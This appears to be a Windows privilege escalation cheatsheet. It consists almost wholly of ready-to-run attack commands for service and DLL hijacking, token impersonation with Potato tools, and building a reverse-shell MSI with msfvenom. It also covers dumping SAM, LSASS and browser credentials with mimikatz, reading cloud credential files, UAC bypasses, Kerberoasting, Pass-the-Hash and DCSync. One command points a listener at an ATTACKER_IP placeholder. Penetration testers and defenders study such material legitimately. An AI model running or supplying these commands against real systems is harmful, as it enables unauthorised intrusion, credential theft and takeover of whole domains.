# Windows Privilege Escalation Cheatsheet

## Initial Enumeration
```cmd
:: Current user and privileges
whoami
whoami /priv
whoami /groups
net user %username%

:: System info
systeminfo
hostname
ver

:: Other users and groups
net user
net localgroup
net localgroup Administrators

:: Network
ipconfig /all
netstat -ano
route print
arp -a

:: Running processes
tasklist /v
wmic process list brief

:: Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

:: Scheduled tasks
schtasks /query /fo LIST /v

:: Services
sc query state=all
wmic service get name,displayname,pathname,startmode
net start
```

## Automated Enumeration
```cmd
:: WinPEAS
winpeas.exe

:: PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

:: SharpUp
SharpUp.exe audit

:: Seatbelt (comprehensive)
Seatbelt.exe -group=all

:: Watson (missing KB patches)
Watson.exe

:: PrivescCheck (PowerShell)
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

## Service Exploitation
```cmd
:: Unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
:: If path is: C:\Program Files\My App\service.exe (unquoted with spaces)
:: Place payload at: C:\Program.exe or C:\Program Files\My.exe

:: Weak service permissions (check with accesschk)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
:: If you have SERVICE_CHANGE_CONFIG:
sc config vuln_service binpath="C:\temp\reverse.exe"
sc stop vuln_service
sc start vuln_service

:: Writable service binary
accesschk.exe /accepteula -wvu "C:\Program Files\Service\service.exe"
:: If writable, replace with malicious binary
copy C:\temp\payload.exe "C:\Program Files\Service\service.exe"
sc stop vuln_service
sc start vuln_service

:: DLL Hijacking in services
:: If service loads a missing DLL from a writable directory
:: Use Process Monitor to identify missing DLLs
:: Create malicious DLL and place in search path
```

## Token Impersonation
```cmd
:: Check for useful privileges
whoami /priv

:: SeImpersonatePrivilege (service accounts, IIS, SQL)
:: PrintSpoofer
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -i -c "C:\temp\reverse.exe"

:: GodPotato (works on all Windows versions)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\reverse.exe"

:: JuicyPotato (Windows 10 < 1809, Server 2016/2019)
JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t *

:: SweetPotato
SweetPotato.exe -a "C:\temp\reverse.exe"

:: RoguePotato (Windows 10 1809+, requires listener on attacker)
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\reverse.exe" -l 9999

:: SeBackupPrivilege (read any file)
:: Copy SAM and SYSTEM hives
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
:: Extract hashes with secretsdump on attacker
secretsdump.py -sam sam -system system LOCAL
```

## Registry Exploits
```cmd
:: AlwaysInstallElevated (install MSI as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: If both return 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

:: AutoRun programs
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
:: If value points to a writable path, replace the binary

:: Saved credentials in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

:: SAM and SYSTEM backup
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
```

## Credential Harvesting
```cmd
:: Saved credentials
cmdkey /list
:: If found, use:
runas /savecred /user:admin "cmd.exe /c C:\temp\reverse.exe"

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

:: Windows Credential Manager
rundll32.exe keymgr.dll,KRShowKeyMgr

:: SAM dump (requires SYSTEM or backup of SAM/SYSTEM)
:: From live system with mimikatz:
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

:: LSASS dump
:: Task Manager > Details > lsass.exe > Create dump file
:: Or with Procdump:
procdump.exe -accepteula -ma lsass.exe lsass.dmp
:: Then on attacker:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

:: DPAPI (browser passwords, etc.)
mimikatz.exe "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data"

:: Search for credential files
dir /s /b C:\Users\*.xml C:\Users\*.ini C:\Users\*.txt C:\Users\*.cfg 2>nul | findstr /i "pass cred"
findstr /si password *.xml *.ini *.txt *.cfg *.config
type C:\Windows\Panther\Unattend\Unattended.xml
type C:\Windows\Panther\Unattend.xml
```

## UAC Bypass
```cmd
:: Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

:: fodhelper.exe bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
:: Clean up:
reg delete HKCU\Software\Classes\ms-settings /f

:: eventvwr.exe bypass
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe

:: UACME (collection of UAC bypasses)
:: https://github.com/hfiref0x/UACME
Akagi64.exe <method_number>
```

## Active Directory (Domain Escalation)
```cmd
:: Domain enumeration
net user /domain
net group /domain
net group "Domain Admins" /domain
nltest /dclist:domain.local

:: BloodHound collection
SharpHound.exe -c All
:: Upload to BloodHound GUI, find shortest path to Domain Admin

:: Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
:: Crack with hashcat: hashcat -m 13100 hashes.txt wordlist.txt

:: AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep.txt
:: Crack: hashcat -m 18200 asrep.txt wordlist.txt

:: ADCS exploitation (Certify)
Certify.exe find /vulnerable
Certify.exe request /ca:CA_NAME /template:VULN_TEMPLATE /altname:administrator

:: Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:admin /domain:. /ntlm:HASH /run:cmd.exe"

:: DCSync (requires replication rights)
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator"
```

## Miscellaneous
```cmd
:: Installed patches (identify missing)
wmic qfe list brief
systeminfo | findstr /i "KB"

:: Check for stored credentials in common locations
type C:\Users\*\.aws\credentials
type C:\Users\*\.azure\*
type C:\inetpub\wwwroot\web.config
dir /s /b web.config 2>nul

:: PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: Check for vulnerable drivers
driverquery /v

:: Insecure file permissions in PATH
echo %PATH%
:: Check each directory for write permissions with accesschk or icacls
icacls "C:\Program Files\SomeApp"

:: Startup folder (persistence + possible privesc)
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```
